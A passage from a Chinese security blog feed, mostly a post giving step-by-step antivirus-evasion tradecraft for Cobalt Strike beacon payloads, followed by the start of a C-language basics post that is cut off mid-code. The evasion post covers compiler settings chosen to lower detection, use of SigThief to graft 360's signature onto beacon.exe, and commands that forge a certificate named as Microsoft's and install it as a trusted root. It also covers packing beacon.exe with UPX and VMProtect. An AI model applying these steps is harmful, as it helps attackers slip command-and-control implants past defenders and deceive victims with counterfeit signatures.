title="静态编译"></a>静态编译</h4><p>微软在制作Windows系统时,为了提高代码的复用率,提出了⼀个动态链接库的概念(DLL).DLL提供了一种方法,使程序在运行时能够调用不属于其本身的可执行代码的函数。</p><p>如此一来，如果我们的程序在运行时需要调用不属于其本身的函数,而发布的程序中又没有包含这些函数库，便会出现错误。</p><p>解决的办法</p><ol><li><p>将调用到的所有函数库、以及编译生成的程序⼀起提供给使⽤者。</p></li><li><p>将调用到的所有函数在编译时⼀同打包进生成的程序中。</p></li></ol><p>在这两种方法中，后者通常便称为”静态编译”</p><p>项目—&gt;配置属性—&gt;C&#x2F;C++—&gt;代码生成—&gt;运行库—&gt;选择<code>/MT</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281636117.png" data-fancybox="true"/></div></div><h4 id="关闭生成清单文件"><a href="#关闭生成清单文件" class="headerlink" title="关闭生成清单文件"></a>关闭生成清单文件</h4><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410291359439.png" data-fancybox="true"/></div></div><p>常规—&gt;详细输出—&gt;否</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281636860.png" data-fancybox="true"/></div></div><p>清单工具—&gt;输入和输出—&gt;嵌入清单—&gt;否</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410291359106.png" data-fancybox="true"/></div></div><h4 id="关闭SDL检查"><a href="#关闭SDL检查" class="headerlink" title="关闭SDL检查"></a>关闭SDL检查</h4><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281636723.png" data-fancybox="true"/></div></div><h4 id="禁用安全检查"><a href="#禁用安全检查" class="headerlink" title="禁用安全检查"></a>禁用安全检查</h4><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281636613.png" data-fancybox="true"/></div></div><h4 id="关闭生成调试信息"><a href="#关闭生成调试信息" class="headerlink" title="关闭生成调试信息"></a>关闭生成调试信息</h4><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281636945.png" data-fancybox="true"/></div></div><h4 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h4><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281636794.png" data-fancybox="true"/></div></div><h4 id="添加图标"><a href="#添加图标" class="headerlink" title="添加图标"></a>添加图标</h4><p>资源文件—&gt;添加—&gt;资源</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281636268.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281636094.png" data-fancybox="true"/></div></div><h4 id="编译并查杀"><a href="#编译并查杀" class="headerlink" title="编译并查杀"></a>编译并查杀</h4><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281636201.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281636833.png" data-fancybox="true"/></div></div><p><code>Hello World</code>代码也会报毒,这个就和杀毒软件的原理有关了.比如<code>icon</code>、数字签名等</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281636887.png" data-fancybox="true"/></div></div><h3 id="MinGW"><a href="#MinGW" class="headerlink" title="MinGW"></a>MinGW</h3><p>解压<code>x86_64-8.1.0-release-posix-sjlj-rt_v6-rev0.7z</code>,然后将<code>bin</code>目录设置环境变量</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281637177.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281637209.png" data-fancybox="true"/></div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc ConsoleApplication1.c -mwindows -o test.exe</span><br><span class="line"><span class="comment"># 通过 -mwindows 参数屏蔽黑窗口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  linux下编译exe</span></span><br><span class="line">x86_64-w64-mingw32-gcc hello.c -o hello.exe -static </span><br></pre></td></tr></table></figure><p><strong>注意 : 不同的编译器对代码的要求不一样, 报错记得chatgpt分析原因</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc编译c源码文件(.c)</span><br><span class="line">g++编译cpp源码文件(.cpp)</span><br></pre></td></tr></table></figure><h3 id="Intel-C-编译器"><a href="#Intel-C-编译器" class="headerlink" title="Intel C++编译器"></a>Intel C++编译器</h3><p>相比于vs默认的编译器，intel c++编译器编译的exe特征更少、报毒更低，在代码层面免杀时在VT上可</p><p>以很轻松达到0查杀。</p><ol><li><p>安装vs2019或以上版本</p></li><li><p>下载intel安装包</p></li></ol><p>双击<code>w_BaseKit_p_2023.0.0.25940_offline.exe</code>运行, 安装 ( 全部安装完成比较大 )</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281637158.png" data-fancybox="true"/></div></div><p><strong>安装后会自动删除</strong></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281637726.png" data-fancybox="true"/></div></div><p>等待下载,然后勾选<code>I accept the terms of the license agreement</code>，点击下面的<code>Customize</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410291400522.png" data-fancybox="true"/></div></div><p>选择需要安装的项，全部安装需要21GB，选完后点击下面的→按钮进入下一步,然后勾选要为哪个vs安装<code>intel</code>,点击下面的→按钮进入下一步</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281637311.png" data-fancybox="true"/></div></div><p>选择<code>I do NOT consent to the collection of my information</code>,即我不同意收集我的信息，点击<code>install</code>按钮</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410291400023.png" data-fancybox="true"/></div></div><p>退出<code>Visual Studio 2022 Preview</code>.以下警告为:”安装完成后需要重启”,继续点击<code>install</code>安装.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281637703.png" data-fancybox="true"/></div></div><p>开始安装,等到十几分钟.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281637688.png" data-fancybox="true"/></div></div><p>点击<code>Finish</code>.重启系统.打开vs属性页，可以看到intel C++编译器已经有了</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281638311.png" data-fancybox="true"/></div></div><p><code>General</code>—&gt;<code>Warning Level</code>—&gt;<code>Turn Off All Warnings(/W0)</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281638078.png" data-fancybox="true"/></div></div><p><code>Code Generation</code>—&gt;<code>Security Check</code>—&gt;<code>Disable Security Check</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281638234.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281638039.png" data-fancybox="true"/></div></div><h2 id="exe处理"><a href="#exe处理" class="headerlink" title="exe处理"></a>exe处理</h2><blockquote><p>针对360报毒”QVM”问题,比较好的处理方式为数字签名及加资源进行Bypass</p></blockquote><h3 id="加签名"><a href="#加签名" class="headerlink" title="加签名"></a>加签名</h3><h4 id="Sigthief"><a href="#Sigthief" class="headerlink" title="Sigthief"></a>Sigthief</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python38 sigthief.py -i 签名文件 -t 样本.exe -o 输出.exe</span></span><br><span class="line"></span><br><span class="line">D:\Penetration\BypassAV\SigThief-master&gt;python38 sigthief.py -i sign_exe/360.exe -t sign_exe/beacon.exe -o 360_s.exe</span><br><span class="line">!! New Version available now <span class="keyword">for</span> Dev Tier Sponsors! Sponsor here: https://github.com/sponsors/secretsquirrel</span><br><span class="line">Output file: 360_s.exe</span><br><span class="line">Signature appended.</span><br><span class="line">FIN.</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281638942.png" data-fancybox="true"/></div></div><h4 id="自签名"><a href="#自签名" class="headerlink" title="自签名"></a>自签名</h4><p>自签名对<code>Windows Defener</code>效果好.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一次创建签名文件,中间需要输入密码</span></span><br><span class="line">makecert -r -pe -n <span class="string">&quot;CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US&quot;</span> -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv Microsoft.pvk Microsoft.cer</span><br><span class="line"></span><br><span class="line">certutil -user -addstore Root Microsoft.cer</span><br><span class="line"></span><br><span class="line">makecert -pe -n <span class="string">&quot;CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US&quot;</span> -a sha256 -cy end -sky signature -ic Microsoft.cer -iv Microsoft.pvk -sv Microsoft.pvk Microsoft.cer</span><br><span class="line"></span><br><span class="line">pvk2pfx -pvk Microsoft.pvk -spc Microsoft.cer -pfx Microsoft.pfx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过自签名文件添加到exe</span></span><br><span class="line">signtool sign /f Microsoft.pfx /t http://timestamp.digicert.com /fd SHA256 要签名的.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者运行start.bat,直接拖拽exe即可</span></span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281638636.png" data-fancybox="true"/></div></div><h3 id="加资源"><a href="#加资源" class="headerlink" title="加资源"></a>加资源</h3><h4 id="Resource-Hacker"><a href="#Resource-Hacker" class="headerlink" title="Resource Hacker"></a>Resource Hacker</h4><p>文件—&gt;打开—&gt;操作 –&gt; 从资源文件添加—&gt;选择样本文件.可全选或自选—&gt;导入</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281638906.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281638315.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281638288.png" data-fancybox="true"/></div></div><h3 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h3><h4 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h4><p>upx是一款压缩壳, 针对exe文件进行代码压缩, 压缩后的文件体积会小于原始文件.</p><p>UPX 提供了不同的压缩级别，级别越高，压缩率越大，但压缩和解压缩的速度可能会减慢。压缩级别范围是从 1 到 9。数字越高，表示压缩级别越高，对文件大小的减小也越明显</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx -9 beacon.exe</span><br></pre></td></tr></table></figure><h4 id="Shielden"><a href="#Shielden" class="headerlink" title="Shielden"></a>Shielden</h4><p>Safengine Shielden 软件保护加壳工具是一款能够帮助用户对自己电脑上各种文件程序进行加壳免杀的Windows操作平台功能性保护工具，它可以帮助用户对自己需要进行保护的文件程序进行加壳处理拥有强大的虚拟机代码保护系统，能够让你的文件程序无需担心被逆向工程破解入侵，拥有专业级的加密操作，保护你的文件不被恶意修改。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281638521.png" data-fancybox="true"/></div></div><h4 id="Vmp"><a href="#Vmp" class="headerlink" title="Vmp"></a>Vmp</h4><p>MProtect Software 3.5是一款给软件增加防护的工具。俗称vmp加壳。它能够帮你给软件加一层防护。防止被破解反编译。</p><p>打开选择exe文件, 然后运行</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281638742.png" data-fancybox="true"/></div></div><h3 id="文件的熵值"><a href="#文件的熵值" class="headerlink" title="文件的熵值"></a>文件的熵值</h3><p>Entropy（熵）能被用于衡量系统的混乱程度，熵值越大，说明混乱程度越高。熵也被用于检测PE文件病毒, 一般一些合法软件的熵值在 4.8 - 7.2 之间</p><h4 id="有阶段样本"><a href="#有阶段样本" class="headerlink" title="有阶段样本"></a>有阶段样本</h4><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281638375.png" data-fancybox="true"/></div></div><h4 id="无阶段样本"><a href="#无阶段样本" class="headerlink" title="无阶段样本"></a>无阶段样本</h4><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281638397.png" data-fancybox="true"/></div></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Cobalt Strike" scheme="https://jiangjiyue.github.io/tags/Cobalt-Strike/"/>
    
    <category term="后渗透" scheme="https://jiangjiyue.github.io/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>CS-C语言总结</title>
    <link href="https://jiangjiyue.github.io/2024/10/27/77c80f0f/"/>
    <id>https://jiangjiyue.github.io/2024/10/27/77c80f0f/</id>
    <published>2024-10-27T12:01:49.000Z</published>
    <updated>2024-10-29T07:14:04.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 17.68K </p>    </div>    <div class="cell" style="">    <p>代码: 16.22K, 文本: 1.24K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 1.26 小时</p>    </div>    </div><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><table><thead><tr><th align="left"></th><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left">char</td><td align="left">1 字节</td><td align="left">-128 到 127 或 0 到 255</td></tr><tr><td align="left">unsigned char</td><td align="left">1 字节</td><td align="left">0 到 255</td></tr><tr><td align="left">signed char</td><td align="left">1 字节</td><td align="left">-128 到 127</td></tr><tr><td align="left">int</td><td align="left">2 或 4 字节</td><td align="left">-32,768 到 32,767 或 -2,147,483,648 到 2,147,483,647</td></tr><tr><td align="left">unsigned int</td><td align="left">2 或 4 字节</td><td align="left">0 到 65,535 或 0 到 4,294,967,295</td></tr><tr><td align="left">short</td><td align="left">2 字节</td><td align="left">-32,768 到 32,767</td></tr><tr><td align="left">unsigned short</td><td align="left">2 字节</td><td align="left">0 到 65,535</td></tr><tr><td align="left">long</td><td align="left">4 字节</td><td align="left">-2,147,483,648 到 2,147,483,647</td></tr><tr><td align="left">unsigned long</td><td align="left">4 字节</td><td align="left">0 到 4,294,967,295</td></tr></tbody></table><table><thead><tr><th><strong>运算符</strong></th><th><strong>描述</strong></th><th><strong>实例</strong></th><th align="left"></th></tr></thead><tbody><tr><td>+</td><td>把两个操作数相加</td><td>A + B 将得到 30</td><td align="left"></td></tr><tr><td>-</td><td>从第一个操作数中减去第二个操作数</td><td>A - B 将得到 -10</td><td align="left"></td></tr><tr><td>*</td><td>把两个操作数相乘</td><td>A * B 将得到 200</td><td align="left"></td></tr><tr><td>&#x2F;</td><td>分子除以分母</td><td>B &#x2F; A 将得到 2</td><td align="left"></td></tr><tr><td>%</td><td>取模运算符，整除后的余数</td><td>B % A 将得到 0</td><td align="left"></td></tr><tr><td>++</td><td>自增运算符，整数值增加 1</td><td>A++ 将得到 11</td><td align="left"></td></tr><tr><td>–</td><td>自减运算符，整数值减少 1</td><td>A– 将得到 9</td><td align="left"></td></tr><tr><td><strong>运算 符</strong></td><td><strong>描述</strong></td><td><strong>实例</strong></td><td align="left"></td></tr><tr><td>&#x3D;&#x3D;</td><td>检查两个操作数的值是否相等，如果相等则条件为真。</td><td>(A &#x3D;&#x3D; B) 为 假。</td><td align="left"></td></tr><tr><td>!&#x3D;</td><td>检查两个操作数的值是否相等，如果不相等则条件为真。</td><td>(A !&#x3D; B) 为真。</td><td align="left"></td></tr><tr><td>&gt;</td><td>检查左操作数的值是否大于右操作数的值，如果是则条件为真。</td><td>(A &gt; B) 为假。</td><td align="left"></td></tr><tr><td>&lt;</td><td>检查左操作数的值是否小于右操作数的值，如果是则条件为真。</td><td>(A &lt; B) 为真。</td><td align="left"></td></tr><tr><td>&gt;&#x3D;</td><td>检查左操作数的值是否大于或等于右操作数的值，如果是则条件为 真。</td><td>(A &gt;&#x3D; B) 为 假。</td><td align="left"></td></tr><tr><td>&lt;&#x3D;</td><td>检查左操作数的值是否小于或等于右操作数的值，如果是则条件为 真。</td><td>(A &lt;&#x3D; B) 为 真。</td><td align="left"></td></tr><tr><td><strong>运算 符</strong></td><td><strong>描述</strong></td><td><strong>实例</strong></td><td align="left"></td></tr><tr><td>&amp;&amp;</td><td>称为逻辑与运算符。如果两个操作数都非零，则条件为真。</td><td>(A &amp;&amp; B) 为 假。</td><td align="left"></td></tr><tr><td></td><td></td><td>称为逻辑或运算符。如果两个操作数中有任意一个非零，则条件为 真。</td><td align="left">(A</td></tr><tr><td>!</td><td>称为逻辑非运算符。用来逆转操作数的逻辑状态。如果条件为真则逻 辑非运算符将使其为假。</td><td>!(A &amp;&amp; B) 为 真。</td><td align="left"></td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">rust c++升级版  语法严谨</span></span><br><span class="line"><span class="comment">golang 体积太大</span></span><br><span class="line"><span class="comment">python installer 被厂商标记了</span></span><br><span class="line"><span class="comment">c++ 体积会比C大</span></span><br><span class="line"><span class="comment">c 更贴近底层</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;locale.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明:函数用的什么类型就返回什么类型</span></span><br><span class="line"><span class="comment">// 全局变量---&gt;函数之外的变量,函数执行完成后内存不会清零,除非程序结束</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR <span class="string">&quot;全局变量&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fun_Void</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// void没有返回类型的类型.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fun_Int</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">fun_Char</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 局部变量---&gt;函数内部的变量,函数执行完成后内存会随着函数结束而清零</span></span><br><span class="line"><span class="type">char</span>* cStr = <span class="string">&quot;你好世界&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> cStr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">fun_Bool</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Division</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line"><span class="type">int</span> c = a / b;</span><br><span class="line"><span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 变量的声明作用域初始化以及变量的命名规则</span></span><br><span class="line"><span class="comment">// 命名2种</span></span><br><span class="line"><span class="comment">//Linux </span></span><br><span class="line"><span class="type">char</span>* ip_str = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//windows </span></span><br><span class="line"><span class="type">char</span>* ipStr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// char是utf-8</span></span><br><span class="line"><span class="comment">// wchar为utf-16</span></span><br><span class="line"><span class="type">char</span> cStr1 = <span class="string">&#x27;a&#x27;</span>; <span class="comment">// 只能存储一个字符串,存储多个可以用字符串数组或字符串指针</span></span><br><span class="line"><span class="type">char</span> cStr2[] = <span class="string">&quot;aaaaabbbbbbbbbbbbbb&quot;</span>; <span class="comment">// 字符串数组</span></span><br><span class="line"><span class="type">char</span>* cStr3 = <span class="string">&quot;aaaaaaaaaaaa&quot;</span>; <span class="comment">//字符串指针</span></span><br><span class="line"><span class="type">char</span>* cStr4[] = &#123; <span class="string">&quot;aaaaa&quot;</span>,<span class="string">&quot;bbbbbbbbbbbbbb&quot;</span> &#125;; <span class="comment">// 字符串指针数组</span></span><br><span class="line"><span class="comment">// 报错: char cStr1这种声明是无法存储字符串的</span></span><br><span class="line"><span class="comment">// %c打印单字节</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;字符串: %c\n&quot;</span>,cStr1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;字符串数组: %s\n&quot;</span>,cStr2);</span><br><span class="line"><span class="comment">// 无法打印,因为他是数组,我们打印需要给个坐标.</span></span><br><span class="line"><span class="comment">//printf(&quot;字符串指针数组: %s\n&quot;,cStr3);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;字符串指针数组: %s\n&quot;</span>, cStr4[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;字符串指针数组: %s\n&quot;</span>, cStr4[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* cStr = <span class="string">&quot;char: 你好世界&quot;</span>;</span><br><span class="line">WCHAR* wStr = <span class="string">L&quot;WCHAR: 你好世界&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, cStr);</span><br><span class="line"><span class="comment">// 打印wStr一定要本地设置下面的语言包,并且头文件中引入&lt;locale.h&gt;</span></span><br><span class="line">setlocale(LC_ALL, <span class="string">&quot;zh-CN&quot;</span>);</span><br><span class="line">wprintf(<span class="string">L&quot;wprintf可以: %ls\n&quot;</span>, wStr);</span><br><span class="line"><span class="comment">// 错误示范</span></span><br><span class="line"><span class="comment">//printf(&quot;printf无法打印wChar类型的内容:%s\n&quot;, wStr);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span>* a = <span class="number">2</span>;</span><br><span class="line">BOOL is_Bool = TRUE;</span><br><span class="line">BOOL is_Bool2 = FALSE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// strlen() 计算字符串长度</span></span><br><span class="line"><span class="comment">// sizeof() 计算数组或类型大小</span></span><br><span class="line"><span class="type">int</span> strLength = <span class="built_in">strlen</span>(cStr2);</span><br><span class="line"><span class="type">int</span> strLength2 = <span class="keyword">sizeof</span>(cStr2);</span><br><span class="line"><span class="comment">// 字符串中最后面会有个终止的空字符\0</span></span><br><span class="line"><span class="comment">// strlen 不包括终止的空字符 \0</span></span><br><span class="line"><span class="comment">// sizeof 包括终止的空字符 \0</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;strlen: %d\nsizeof: %d\n&quot;</span>, strLength, strLength2);</span><br><span class="line"><span class="comment">// 所以在内存申请的时候如果需要用strlen,则需要+1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;strlen + 1: %d\n&quot;</span>, strLength+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针的长度</span></span><br><span class="line"><span class="comment">// 忽略了终止的空字符 \0</span></span><br><span class="line"><span class="comment">// cStr3的长度是12</span></span><br><span class="line"><span class="type">int</span> cStr3Len = <span class="built_in">strlen</span>(cStr3);</span><br><span class="line"><span class="comment">// 计算的是变量或类型的大小.cStr3 是一个指向字符的指针（char* )</span></span><br><span class="line"><span class="comment">// 指针的大小取决于机器的体系结构：在32位系统中，指针大小通常是4字节；在64位系统中，指针大小通常是8字节。</span></span><br><span class="line"><span class="type">int</span> cStr3Len1 = <span class="keyword">sizeof</span>(cStr3);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;指针类型:\nstrlen: %d\nsizeof: %d\n&quot;</span>, cStr3Len, cStr3Len1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;指针类型结束\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明接收</span></span><br><span class="line">fun_Void();</span><br><span class="line">INT int_Str = fun_Int();</span><br><span class="line"><span class="type">char</span>* char_Str = fun_Char();</span><br><span class="line">BOOL bool_Str = fun_Bool();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运算符 加减</span></span><br><span class="line"><span class="type">int</span> sum = <span 